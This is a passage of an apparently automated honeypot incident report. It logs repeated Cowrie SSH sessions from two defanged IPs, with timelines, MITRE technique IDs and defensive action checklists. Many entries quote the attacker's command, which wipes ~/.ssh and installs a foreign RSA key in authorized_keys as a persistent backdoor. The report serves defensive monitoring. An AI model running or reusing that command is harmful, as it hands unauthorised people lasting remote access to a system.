| `2026-04-22 17:46:29` | `cowrie.command.input` |
| `2026-04-22 17:46:29` | `cowrie.command.failed` |
| `2026-04-22 17:46:29` | `cowrie.log.closed` |
| `2026-04-22 17:46:29` | `cowrie.session.params` |
| `2026-04-22 17:46:29` | `cowrie.command.input` |
| `2026-04-22 17:46:30` | `cowrie.session.file_download` |
| `2026-04-22 17:46:30` | `cowrie.log.closed` |
| `2026-04-22 17:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e96fe741aa

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:46 |
| **Last Seen** | 2026-04-22 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:46:32` | `cowrie.session.connect` |
| `2026-04-22 17:46:32` | `cowrie.client.version` |
| `2026-04-22 17:46:32` | `cowrie.client.kex` |
| `2026-04-22 17:46:33` | `cowrie.login.success` |
| `2026-04-22 17:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fdd1aaf0617

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:46 |
| **Last Seen** | 2026-04-22 17:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:46:44` | `cowrie.session.connect` |
| `2026-04-22 17:46:44` | `cowrie.client.version` |
| `2026-04-22 17:46:44` | `cowrie.client.kex` |
| `2026-04-22 17:46:45` | `cowrie.login.success` |
| `2026-04-22 17:46:45` | `cowrie.session.params` |
| `2026-04-22 17:46:45` | `cowrie.command.input` |
| `2026-04-22 17:46:45` | `cowrie.command.failed` |
| `2026-04-22 17:46:45` | `cowrie.log.closed` |
| `2026-04-22 17:46:46` | `cowrie.session.params` |
| `2026-04-22 17:46:46` | `cowrie.command.input` |
| `2026-04-22 17:46:46` | `cowrie.session.file_download` |
| `2026-04-22 17:46:46` | `cowrie.log.closed` |
| `2026-04-22 17:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed57ebf052a6

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:46 |
| **Last Seen** | 2026-04-22 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:46:48` | `cowrie.session.connect` |
| `2026-04-22 17:46:48` | `cowrie.client.version` |
| `2026-04-22 17:46:48` | `cowrie.client.kex` |
| `2026-04-22 17:46:49` | `cowrie.login.success` |
| `2026-04-22 17:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b91af2f151d

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:46 |
| **Last Seen** | 2026-04-22 17:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:46:57` | `cowrie.session.connect` |
| `2026-04-22 17:46:57` | `cowrie.client.version` |
| `2026-04-22 17:46:57` | `cowrie.client.kex` |
| `2026-04-22 17:46:58` | `cowrie.login.success` |
| `2026-04-22 17:46:58` | `cowrie.session.params` |
| `2026-04-22 17:46:58` | `cowrie.command.input` |
| `2026-04-22 17:46:58` | `cowrie.command.failed` |
| `2026-04-22 17:46:59` | `cowrie.log.closed` |
| `2026-04-22 17:46:59` | `cowrie.session.params` |
| `2026-04-22 17:46:59` | `cowrie.command.input` |
| `2026-04-22 17:46:59` | `cowrie.session.file_download` |
| `2026-04-22 17:46:59` | `cowrie.log.closed` |
| `2026-04-22 17:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb1e6fbe93c6

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:47 |
| **Last Seen** | 2026-04-22 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:47:01` | `cowrie.session.connect` |
| `2026-04-22 17:47:01` | `cowrie.client.version` |
| `2026-04-22 17:47:01` | `cowrie.client.kex` |
| `2026-04-22 17:47:02` | `cowrie.login.success` |
| `2026-04-22 17:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3442489d0d44

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:47 |
| **Last Seen** | 2026-04-22 17:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:47:44` | `cowrie.session.connect` |
| `2026-04-22 17:47:44` | `cowrie.client.version` |
| `2026-04-22 17:47:44` | `cowrie.client.kex` |
| `2026-04-22 17:47:45` | `cowrie.login.success` |
| `2026-04-22 17:47:45` | `cowrie.session.params` |
| `2026-04-22 17:47:45` | `cowrie.command.input` |
| `2026-04-22 17:47:45` | `cowrie.command.failed` |
| `2026-04-22 17:47:45` | `cowrie.log.closed` |
| `2026-04-22 17:47:46` | `cowrie.session.params` |
| `2026-04-22 17:47:46` | `cowrie.command.input` |
| `2026-04-22 17:47:46` | `cowrie.session.file_download` |
| `2026-04-22 17:47:46` | `cowrie.log.closed` |
| `2026-04-22 17:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab61f8b0f887

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:47 |
| **Last Seen** | 2026-04-22 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:47:48` | `cowrie.session.connect` |
| `2026-04-22 17:47:48` | `cowrie.client.version` |
| `2026-04-22 17:47:48` | `cowrie.client.kex` |
| `2026-04-22 17:47:49` | `cowrie.login.success` |
| `2026-04-22 17:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee75f734cf45

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:47 |
| **Last Seen** | 2026-04-22 17:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:47:56` | `cowrie.session.connect` |
| `2026-04-22 17:47:56` | `cowrie.client.version` |
| `2026-04-22 17:47:56` | `cowrie.client.kex` |
| `2026-04-22 17:47:57` | `cowrie.login.success` |
| `2026-04-22 17:47:57` | `cowrie.session.params` |
| `2026-04-22 17:47:57` | `cowrie.command.input` |
| `2026-04-22 17:47:57` | `cowrie.command.failed` |
| `2026-04-22 17:47:58` | `cowrie.log.closed` |
| `2026-04-22 17:47:58` | `cowrie.session.params` |
| `2026-04-22 17:47:58` | `cowrie.command.input` |
| `2026-04-22 17:47:58` | `cowrie.session.file_download` |
| `2026-04-22 17:47:58` | `cowrie.log.closed` |
| `2026-04-22 17:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b264f7f822fd

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:48 |
| **Last Seen** | 2026-04-22 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:48:00` | `cowrie.session.connect` |
| `2026-04-22 17:48:00` | `cowrie.client.version` |
| `2026-04-22 17:48:01` | `cowrie.client.kex` |
| `2026-04-22 17:48:01` | `cowrie.login.success` |
| `2026-04-22 17:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c7268feeb36

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:48 |
| **Last Seen** | 2026-04-22 17:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:48:23` | `cowrie.session.connect` |
| `2026-04-22 17:48:23` | `cowrie.client.version` |
| `2026-04-22 17:48:23` | `cowrie.client.kex` |
| `2026-04-22 17:48:24` | `cowrie.login.success` |
| `2026-04-22 17:48:24` | `cowrie.session.params` |
| `2026-04-22 17:48:24` | `cowrie.command.input` |
| `2026-04-22 17:48:24` | `cowrie.command.failed` |
| `2026-04-22 17:48:24` | `cowrie.log.closed` |
| `2026-04-22 17:48:24` | `cowrie.session.params` |
| `2026-04-22 17:48:24` | `cowrie.command.input` |
| `2026-04-22 17:48:25` | `cowrie.session.file_download` |
| `2026-04-22 17:48:25` | `cowrie.log.closed` |
| `2026-04-22 17:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8cbaa2d77bb

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:48 |
| **Last Seen** | 2026-04-22 17:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:48:26` | `cowrie.session.connect` |
| `2026-04-22 17:48:26` | `cowrie.client.version` |
| `2026-04-22 17:48:26` | `cowrie.client.kex` |
| `2026-04-22 17:48:27` | `cowrie.login.success` |
| `2026-04-22 17:48:28` | `cowrie.session.params` |
| `2026-04-22 17:48:28` | `cowrie.command.input` |
| `2026-04-22 17:48:28` | `cowrie.command.failed` |
| `2026-04-22 17:48:28` | `cowrie.log.closed` |
| `2026-04-22 17:48:28` | `cowrie.session.params` |
| `2026-04-22 17:48:28` | `cowrie.command.input` |
| `2026-04-22 17:48:29` | `cowrie.session.file_download` |
| `2026-04-22 17:48:29` | `cowrie.log.closed` |
| `2026-04-22 17:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae6ddf019211

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:48 |
| **Last Seen** | 2026-04-22 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:48:27` | `cowrie.session.connect` |
| `2026-04-22 17:48:27` | `cowrie.client.version` |
| `2026-04-22 17:48:27` | `cowrie.client.kex` |
| `2026-04-22 17:48:28` | `cowrie.login.success` |
| `2026-04-22 17:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0deaa0fcd0ab

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:48 |
| **Last Seen** | 2026-04-22 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:48:32` | `cowrie.session.connect` |
| `2026-04-22 17:48:32` | `cowrie.client.version` |
| `2026-04-22 17:48:32` | `cowrie.client.kex` |
| `2026-04-22 17:48:33` | `cowrie.login.success` |
| `2026-04-22 17:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b4bbca28c5

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:02` | `cowrie.session.connect` |
| `2026-04-22 17:49:02` | `cowrie.client.version` |
| `2026-04-22 17:49:02` | `cowrie.client.kex` |
| `2026-04-22 17:49:03` | `cowrie.login.success` |
| `2026-04-22 17:49:03` | `cowrie.session.params` |
| `2026-04-22 17:49:03` | `cowrie.command.input` |
| `2026-04-22 17:49:03` | `cowrie.command.failed` |
| `2026-04-22 17:49:03` | `cowrie.log.closed` |
| `2026-04-22 17:49:04` | `cowrie.session.params` |
| `2026-04-22 17:49:04` | `cowrie.command.input` |
| `2026-04-22 17:49:04` | `cowrie.session.file_download` |
| `2026-04-22 17:49:04` | `cowrie.log.closed` |
| `2026-04-22 17:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-391545b3c4e0

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:06` | `cowrie.session.connect` |
| `2026-04-22 17:49:06` | `cowrie.client.version` |
| `2026-04-22 17:49:06` | `cowrie.client.kex` |
| `2026-04-22 17:49:07` | `cowrie.login.success` |
| `2026-04-22 17:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d189f9031fb4

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:33` | `cowrie.session.connect` |
| `2026-04-22 17:49:33` | `cowrie.client.version` |
| `2026-04-22 17:49:34` | `cowrie.client.kex` |
| `2026-04-22 17:49:34` | `cowrie.login.success` |
| `2026-04-22 17:49:35` | `cowrie.session.params` |
| `2026-04-22 17:49:35` | `cowrie.command.input` |
| `2026-04-22 17:49:35` | `cowrie.command.failed` |
| `2026-04-22 17:49:35` | `cowrie.log.closed` |
| `2026-04-22 17:49:35` | `cowrie.session.params` |
| `2026-04-22 17:49:35` | `cowrie.command.input` |
| `2026-04-22 17:49:35` | `cowrie.session.file_download` |
| `2026-04-22 17:49:35` | `cowrie.log.closed` |
| `2026-04-22 17:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6493218206a8

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:38` | `cowrie.session.connect` |
| `2026-04-22 17:49:38` | `cowrie.client.version` |
| `2026-04-22 17:49:38` | `cowrie.client.kex` |
| `2026-04-22 17:49:38` | `cowrie.login.success` |
| `2026-04-22 17:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
